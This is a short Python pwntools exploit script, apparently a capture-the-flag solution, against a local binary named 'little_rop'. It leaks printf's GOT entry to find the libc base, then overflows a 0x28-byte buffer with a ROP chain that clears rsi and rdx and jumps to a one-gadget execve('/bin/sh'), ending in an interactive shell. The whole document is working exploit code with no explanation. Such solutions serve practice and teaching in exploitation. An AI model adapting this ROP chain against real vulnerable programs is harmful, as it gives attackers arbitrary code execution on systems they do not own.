from pwn import *

context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

printf_got = 0x000000000404020

r = process('./little_rop')

r.sendlineafter(b': ', str(printf_got).encode())

libc = u64(r.recv(8)) - 0x61c90
info(f'libc : {hex(libc)}')

# 0xe3b04 execve("/bin/sh", rsi, rdx)
# constraints:
#   [rsi] == NULL || rsi == NULL
#   [rdx] == NULL || rdx == NULL
pop_rsi_ret = libc + 0x000000000002601f
pop_rdx_ret = libc + 0x0000000000142c92
one_gad = libc + 0xe3b04

r.sendlineafter(b': ', b'a' * 0x28 + flat(
    pop_rsi_ret, 0, 
    pop_rdx_ret, 0,
    one_gad
))

r.interactive()